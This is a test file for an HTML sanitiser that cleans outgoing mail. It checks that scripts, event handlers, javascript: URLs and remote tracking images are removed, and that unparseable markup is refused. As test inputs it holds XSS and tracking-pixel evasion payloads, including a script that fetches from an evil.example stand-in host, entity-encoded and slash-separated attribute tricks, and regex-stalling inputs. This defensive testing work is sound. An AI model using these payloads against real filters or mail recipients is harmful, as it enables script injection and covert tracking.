import { describe, expect, it } from 'vitest';

import { ToolInputError } from '../src/errors.js';
import {
  decodeCssEscapes,
  decodeReferences,
  htmlToText,
  sanitizeHtml,
} from '../src/sanitize.js';

describe('sanitizeHtml', () => {
  it('leaves ordinary markup alone', () => {
    const input = '<p>Hello <b>Anna</b></p><p>Regards</p>';
    const result = sanitizeHtml(input);
    expect(result.html).toBe(input);
    expect(result.removed).toEqual([]);
  });

  it('removes a script element with its contents', () => {
    const result = sanitizeHtml('<p>a</p><script>steal()</script><p>b</p>');
    expect(result.html).not.toMatch(/steal/);
    expect(result.html).toBe('<p>a</p><p>b</p>');
    expect(result.removed).toContain('<script> element');
  });

  it('removes an unclosed script tag too', () => {
    const result = sanitizeHtml(
      '<p>a</p><script src="https://x.example/s.js">'
    );
    expect(result.html).not.toMatch(/script/i);
    expect(result.removed.join(' ')).toMatch(/script/);
  });

  it('removes event handlers in every quoting style', () => {
    const result = sanitizeHtml(
      `<div onclick="a()" onmouseover='b()' onload=c()>x</div>`
    );
    expect(result.html).not.toMatch(/onclick|onmouseover|onload/);
    expect(result.html).toContain('<div>x</div>');
    expect(result.removed).toContain('click handler');
  });

  it('removes a remotely loaded image, which is how a tracking pixel works', () => {
    const result = sanitizeHtml(
      '<p>hi</p><img src="https://tracker.example/p.gif?u=anna" width="1">'
    );
    expect(result.html).toBe('<p>hi</p>');
    expect(result.removed).toContain('remotely loaded <img> (tracking risk)');
  });

  it('removes a protocol-relative image source as well', () => {
    const result = sanitizeHtml('<img src="//tracker.example/p.gif">');
    expect(result.html).toBe('');
  });

  it('keeps links, which fetch nothing on their own', () => {
    const result = sanitizeHtml('<a href="https://example.net/x">click</a>');
    expect(result.html).toContain('href="https://example.net/x"');
    expect(result.removed).toEqual([]);
  });

  it('strips a javascript: URL but keeps the element', () => {
    const result = sanitizeHtml('<a href="javascript:steal()">click</a>');
    expect(result.html).not.toMatch(/javascript:/);
    expect(result.removed).toContain('javascript: URL in href');
  });

  it('sees through whitespace and control characters in a scheme', () => {
    // "java\tscript:" is javascript: to a browser, so it has to be one here.
    const result = sanitizeHtml('<a href="java\tscript:steal()">click</a>');
    expect(result.html).not.toMatch(/steal/);
  });

  it('strips a data: URL', () => {
    const result = sanitizeHtml(
      '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'
    );
    expect(result.html).not.toMatch(/data:/);
  });

  it('neutralises url() inside a style attribute', () => {
    const result = sanitizeHtml(
      `<div style="background:url('https://tracker.example/p.gif')">x</div>`
    );
    expect(result.html).not.toMatch(/tracker\.example/);
    expect(result.removed).toContain('url() in a style attribute');
  });

  it('drops iframes, objects and forms with their contents', () => {
    const result = sanitizeHtml(
      '<iframe src="https://x.example"></iframe><object data="x"></object><form action="https://x.example"><input name="a"></form>'
    );
    expect(result.html.replace(/\s/g, '')).toBe('');
  });

  it('refuses an over-long body rather than truncating it', () => {
    // Half a message is worse than an error: it would arrive looking deliberate.
    expect(() => sanitizeHtml('<p>x</p>'.repeat(100_000))).toThrow(
      ToolInputError
    );
    expect(() => sanitizeHtml('<p>x</p>'.repeat(100_000))).toThrow(
      /over the limit/
    );
  });

  it('reports each kind of removal once, not once per occurrence', () => {
    const result = sanitizeHtml(
      '<img src="https://a.example/1.gif"><img src="https://a.example/2.gif">'
    );
    expect(result.removed.filter((r) => r.includes('<img>')).length).toBe(1);
  });
});

describe('a "<" inside an attribute value', () => {
  // The attribute part used to be `[^<>]`, which excludes the very character
  // being smuggled: the pattern never reached the closing `>`, the opening tag
  // did not match, and only `</script>` was removed — while the dialog reported
  // a `<script>` tag had been taken out. False assurance and live script in the
  // same message.

  it('does not let a script element through the block pattern', () => {
    const result = sanitizeHtml(
      '<p>hi</p><script a="<">fetch("https://evil.example/x")</script>'
    );
    expect(result.html).toBe('<p>hi</p>');
    expect(result.html).not.toMatch(/script/i);
    expect(result.html).not.toContain('evil.example');
    expect(result.removed).toContain('<script> element');
  });

  it('does not let a tracking pixel through the subresource pattern', () => {
    const result = sanitizeHtml(
      '<img alt="<" src="https://tracker.example/p.gif?u=anna">'
    );
    expect(result.html).not.toContain('tracker.example');
    expect(result.removed.join(' ')).toMatch(/tracking risk/);
  });

  it('handles the whole reported payload in one go', () => {
    const result = sanitizeHtml(
      '<p>hi</p><script a="<">fetch("https://evil.example/x")</script>' +
        '<img alt="<" src="https://tracker.example/p.gif?u=anna">'
    );
    expect(result.html).toBe('<p>hi</p>');
  });

  it('keeps a single quoted attribute intact', () => {
    const result = sanitizeHtml(`<img alt='<' src="/local.gif">`);
    expect(result.html).toContain('src="/local.gif"');
  });
});

describe('markup that cannot be cleaned with confidence is refused', () => {
  // Refusing is the right failure for outgoing text. A message that never left
  // can be fixed; a message that arrived with a script in it cannot be recalled.

  it('refuses rather than sending a script tag it could not remove', () => {
    // An unterminated attribute quote: no pattern here can find the tag's end.
    expect(() => sanitizeHtml('<p>a</p><script a="')).toThrow(ToolInputError);
    expect(() => sanitizeHtml('<p>a</p><script a="')).toThrow(
      /still contains a <script> tag/
    );
  });

  it('refuses each of the elements that must never survive', () => {
    for (const tag of [
      'script',
      'style',
      'iframe',
      'object',
      'embed',
      'applet',
      'form',
      'svg',
      'math',
    ]) {
      expect(() => sanitizeHtml(`<${tag} a="`)).toThrow(/still contains/);
    }
  });

  it('never reports a removal for a message it went on to send', () => {
    // The assurance the dialog makes: "removed before sending" can only name
    // something that is really gone, because anything left refuses the message.
    const result = sanitizeHtml(
      '<p>a</p><script>steal()</script><iframe src="https://x.example"></iframe>'
    );
    for (const tag of ['script', 'iframe']) {
      if (result.removed.some((entry) => entry.includes(`<${tag}>`))) {
        expect(result.html).not.toMatch(
          new RegExp(`<\\s*/?\\s*${tag}\\b`, 'i')
        );
      }
    }
  });

  it('leaves an escaped mention of a tag alone', () => {
    const result = sanitizeHtml('<p>use the &lt;script&gt; element</p>');
    expect(result.html).toBe('<p>use the &lt;script&gt; element</p>');
  });
});

describe('remote subresources beyond src', () => {
  // Each of these is a counter: it reports the moment a message was opened,
  // from which address, and how often.

  it('removes an image loaded through srcset, which \\bsrc never matched', () => {
    const result = sanitizeHtml(
      '<img srcset="https://tracker.example/p.gif 1x">'
    );
    expect(result.html).not.toContain('tracker.example');
    expect(result.removed.join(' ')).toMatch(/tracking risk/);
  });

  it('checks every candidate of a srcset descriptor list, not just the first', () => {
    const result = sanitizeHtml(
      '<img srcset="/local.gif 1x, https://tracker.example/p.gif 2x">'
    );
    expect(result.html).not.toContain('tracker.example');
  });

  it('removes imagesrcset as well', () => {
    const result = sanitizeHtml(
      '<img imagesrcset="https://tracker.example/p.gif 2x">'
    );
    expect(result.html).not.toContain('tracker.example');
  });

  it('removes a remote video poster', () => {
    const result = sanitizeHtml(
      '<video poster="https://tracker.example/p.gif"></video>'
    );
    expect(result.html).not.toContain('tracker.example');
  });

  it('removes a background attribute without deleting the element', () => {
    // `background` sits on `<body>` and `<table>`, which are not fetch-on-open
    // elements — dropping the whole element would gut the message.
    const result = sanitizeHtml(
      '<table background="https://tracker.example/p.gif"><tr><td>x</td></tr></table>'
    );
    expect(result.html).not.toContain('tracker.example');
    expect(result.html).toContain('<td>x</td>');
    expect(result.removed.join(' ')).toMatch(/background/);
  });

  it('removes a body background too', () => {
    const result = sanitizeHtml(
      '<body background="//tracker.example/p.gif"><p>hi</p></body>'
    );
    expect(result.html).not.toContain('tracker.example');
    expect(result.html).toContain('<p>hi</p>');
  });

  it('leaves a local srcset and a local poster alone', () => {
    const result = sanitizeHtml(
      '<img srcset="cid:logo 1x"><video poster="cid:cover"></video>'
    );
    expect(result.html).toContain('cid:logo');
    expect(result.html).toContain('cid:cover');
    expect(result.removed).toEqual([]);
  });

  it('reaches every quoting style, not only the double-quoted one', () => {
    // Single-quoted and unquoted attributes are what a model writes when it is
    // copying markup from somewhere, and a check that only understood one of
    // the three would be a check with two ways round it.
    for (const attribute of [
      `src='https://tracker.example/p.gif'`,
      'src=https://tracker.example/p.gif',
      `srcset='https://tracker.example/p.gif 1x'`,
      'srcset=https://tracker.example/p.gif',
    ]) {
      expect(sanitizeHtml(`<img ${attribute}>`).html).not.toContain(
        'tracker.example'
      );
    }
    for (const attribute of [
      `background='https://tracker.example/p.gif'`,
      'background=https://tracker.example/p.gif',
    ]) {
      const result = sanitizeHtml(`<table ${attribute}><td>x</td></table>`);
      expect(result.html).not.toContain('tracker.example');
      expect(result.html).toContain('<td>x</td>');
    }
  });

  it('strips an unsafe scheme in every quoting style too', () => {
    for (const attribute of [
      `href='javascript:steal()'`,
      'href=javascript:steal()',
    ]) {
      const result = sanitizeHtml(`<a ${attribute}>click</a>`);
      expect(result.html).not.toMatch(/javascript:/);
      expect(result.removed).toContain('javascript: URL in href');
    }
  });
});

describe('what the tokenizer accepts, the sanitiser has to see', () => {
  // Every pattern below the tag level used to look for a space in front of an
  // attribute name and read the value literally. An HTML tokenizer does
  // neither: an attribute may follow a `/` or a closing quote directly, and a
  // value is decoded before it is read as a URL. Eleven of the thirteen shapes
  // here went out untouched with `removed: []` — the dialog said nothing had
  // been taken out, and SECURITY.md promised the opposite.

  const beacons: Array<[string, string]> = [
    [
      'a slash as the attribute boundary',
      '<img/src="https://tracker.example/p.gif">',
    ],
    [
      'a closing quote as the attribute boundary',
      '<img alt="x"src="https://tracker.example/p.gif">',
    ],
    [
      'a decimal reference in the scheme',
      '<img src="&#104;ttps://tracker.example/p.gif">',
    ],
    [
      'a hex reference in the scheme',
      '<img src="&#x68;ttps://tracker.example/p.gif">',
    ],
    [
      'a numeric reference without its semicolon',
      '<img src="&#104ttps://tracker.example/p.gif">',
    ],
    [
      'a named reference for the colon',
      '<img src="https&colon;//tracker.example/p.gif">',
    ],
    [
      'backslashes as the network-path start',
      '<img src="\\\\tracker.example/p.gif">',
    ],
    ['a mixed network-path start', '<img src="/\\tracker.example/p.gif">'],
    [
      'leading whitespace before the slashes',
      '<img src="  //tracker.example/p.gif">',
    ],
    [
      'a CSS escape inside url(',
      '<div style="background:u\\72l(https://tracker.example/p.gif)">x</div>',
    ],
    [
      'image-set() in place of url()',
      '<div style="background:image-set(https://tracker.example/p.gif 1x)">x</div>',
    ],
    [
      'a background attribute after a slash',
      '<table/background="https://tracker.example/p.gif"><td>x</td></table>',
    ],
  ];

  for (const [name, input] of beacons) {
    it(`removes a remote fetch hidden behind ${name}`, () => {
      const result = sanitizeHtml(input);
      expect(result.html).not.toContain('tracker.example');
      expect(result.html).not.toMatch(/72l|image-set/);
      expect(result.removed.length).toBeGreaterThan(0);
    });
  }

  it('removes an event handler that follows a slash', () => {
    const result = sanitizeHtml('<img/onerror="steal()" alt="x">');
    expect(result.html).not.toMatch(/onerror|steal/);
    expect(result.html).toContain('alt="x"');
    expect(result.removed).toContain('error handler');
  });

  it('strips a javascript: URL that follows a slash or hides in references', () => {
    for (const input of [
      '<a/href="javascript:steal()">x</a>',
      '<a href="&#106;avascript:steal()">x</a>',
      '<a href="java&Tab;script:steal()">x</a>',
      '<a href="&#x6A avascript:steal()">x</a>',
    ]) {
      const result = sanitizeHtml(input);
      expect(result.html).not.toMatch(/javascript|steal|&#/);
      expect(result.removed).toContain('javascript: URL in href');
    }
  });

  it('refuses the void elements the tag pattern cannot parse', () => {
    // `a=b<c` ends the unquoted attribute run at the `<`, so the tag pattern
    // never reaches the `>`. These were not on the refusal list; a `<link>`
    // that survives is a remote stylesheet fetch, a `<base>` redirects every
    // relative URL in the message, a `<meta refresh>` is a redirect.
    for (const input of [
      '<link a=b<c rel="stylesheet" href="https://tracker.example/p.css">',
      '<base a=b<c href="https://tracker.example/"><img src="p.gif">',
      '<meta a=b<c http-equiv="refresh" content="0;url=https://tracker.example/">',
      '<noscript a=b<c><img src="https://tracker.example/p.gif"></noscript>',
    ]) {
      expect(() => sanitizeHtml(input)).toThrow(/still contains a </);
    }
  });

  it('does not eat the quote that belongs to the previous attribute', () => {
    const result = sanitizeHtml(
      '<img alt="x"src="https://tracker.example/p.gif" title="t">'
    );
    // Removed whole by the tag pass; the attribute-level fallback is checked
    // on an element that stays.
    expect(result.html).toBe('');
    const kept = sanitizeHtml('<div title="t"onclick="a()">x</div>');
    expect(kept.html).toBe('<div title="t">x</div>');
  });

  it('caps a caller-chosen scheme in the removal list', () => {
    // The list is read out in the confirmation dialog, where mcp-approval
    // flattens the details but not the consequence. A scheme is legal at any
    // length, so an uncapped one is 60 kB of caller text above the recipients.
    const result = sanitizeHtml(`<a href="${'a'.repeat(5000)}:x">x</a>`);
    expect(result.removed).toHaveLength(1);
    expect(result.removed[0]?.length).toBeLessThan(60);
    expect(result.removed[0]).toMatch(/^a{24}… URL in href$/);
  });

  it('leaves what the tokenizer would also leave alone', () => {
    const input =
      '<p>Hello <b>Anna</b></p><a href="https://example.net/x?a=1&amp;b=2">click</a>' +
      '<img src="cid:logo" alt="a/b &amp; c"><div style="color:red">x</div>';
    const result = sanitizeHtml(input);
    expect(result.html).toBe(input);
    expect(result.removed).toEqual([]);
  });
});

describe('decodeReferences', () => {
  it('decodes numeric references with and without the semicolon', () => {
    expect(decodeReferences('&#104;&#x74;&#116ps')).toBe('https');
  });

  it('decodes the named references that can spell a URL', () => {
    expect(decodeReferences('https&colon;&sol;&sol;x')).toBe('https://x');
    // A legacy name decodes without its semicolon — unless an alphanumeric
    // follows, which is the attribute-value rule the tokenizer applies.
    expect(decodeReferences('a&amp;b &amp c &ampc')).toBe('a&b & c &ampc');
  });

  it('leaves unknown names and bare ampersands alone', () => {
    expect(decodeReferences('&bogus; a & b &colon')).toBe(
      '&bogus; a & b &colon'
    );
  });
});

describe('decodeCssEscapes', () => {
  it('decodes hex escapes with their optional trailing space', () => {
    expect(decodeCssEscapes('u\\72l(x)')).toBe('url(x)');
    expect(decodeCssEscapes('u\\000072 l(x)')).toBe('url(x)');
  });

  it('decodes a backslash before a non-hex character to that character', () => {
    expect(decodeCssEscapes('\\u\\rl(x)')).toBe('url(x)');
  });

  it('decodes HTML references first, as a client does', () => {
    expect(decodeCssEscapes('u&#92;72l(x)')).toBe('url(x)');
  });
});

describe('htmlToText', () => {
  it('turns block structure into line breaks', () => {
    expect(htmlToText('<p>one</p><p>two</p>')).toBe('one\ntwo');
    expect(htmlToText('a<br>b')).toBe('a\nb');
  });

  it('drops non-content elements entirely', () => {
    expect(htmlToText('<style>p{color:red}</style><p>text</p>')).toBe('text');
    expect(htmlToText('<script>steal()</script><p>text</p>')).toBe('text');
  });

  it('decodes the entities a reader would otherwise see raw', () => {
    expect(htmlToText('<p>a &amp; b &lt;c&gt; &quot;d&quot;</p>')).toBe(
      'a & b <c> "d"'
    );
  });

  it('collapses the whitespace that tag removal leaves behind', () => {
    expect(htmlToText('<div>  a   <span>b</span>  </div>')).toBe('a b');
  });
});

describe('malformed markup cannot stall the event loop', () => {
  // These are timings, which is unusual in a unit suite and deliberate here.
  // The patterns are bounded but were not linear: `<img ` repeated with no `>`
  // made every window run at every position, and a 500 kB body took fourteen
  // seconds of blocked event loop — through preview_mail, which needs no send
  // gate, no confirmation and no rate limit. The bound is generous enough not
  // to be flaky on a loaded machine and far below the failure it guards.
  const BUDGET_MS = 400;

  const pathological: Array<[string, string]> = [
    ['unclosed img tags', '<img '.repeat(12800)],
    ['unclosed script tags', '<script '.repeat(8000)],
    ['unterminated comments', '<!--'.repeat(16000)],
    ['nothing but angle brackets', '<'.repeat(64000)],
    ['many opens and one close', '<script >'.repeat(7000) + '</script>'],
    // The shapes the quoted-string alternative added. An alternation where a
    // quote can also be read as an ordinary character is the classic way to
    // reintroduce catastrophic backtracking, so each spelling is timed.
    ['unterminated attribute quotes', '<img src="'.repeat(6400)],
    ['closed attribute quotes', '<img a="b" '.repeat(5818)],
    ['a quote that never closes', `<img a="${'x'.repeat(63000)}`],
    ['alternating quote styles', `<img a="b" c='d' `.repeat(3764)],
    // The shapes the attribute-boundary and decoding work added.
    ['slash-separated attributes', '<img/src="x"/'.repeat(4900)],
    ['unterminated style attributes', '<div style="'.repeat(5300)],
    ['a style full of escapes', `<div style="${'\\7'.repeat(31000)}">`],
    ['a value full of references', `<a href="${'&#1'.repeat(21000)}">`],
    ['a value full of named references', `<a href="${'&colon'.repeat(9000)}">`],
  ];

  for (const [name, input] of pathological) {
    it(`sanitizes ${name} promptly`, () => {
      const started = process.hrtime.bigint();
      // Timing is the assertion, not the outcome: several of these are now
      // refused outright by the final check, which is a different guarantee
      // and has its own tests.
      try {
        sanitizeHtml(input);
      } catch {
        /* the refusal is timed too */
      }
      const ms = Number(process.hrtime.bigint() - started) / 1e6;
      expect(ms).toBeLessThan(BUDGET_MS);
    });

    it(`converts ${name} to text promptly`, () => {
      const started = process.hrtime.bigint();
      htmlToText(input);
      const ms = Number(process.hrtime.bigint() - started) / 1e6;
      expect(ms).toBeLessThan(BUDGET_MS);
    });
  }

  it('refuses a body over the ceiling rather than working on it', () => {
    expect(() => sanitizeHtml('x'.repeat(64_001))).toThrow(/over the limit/);
  });
});
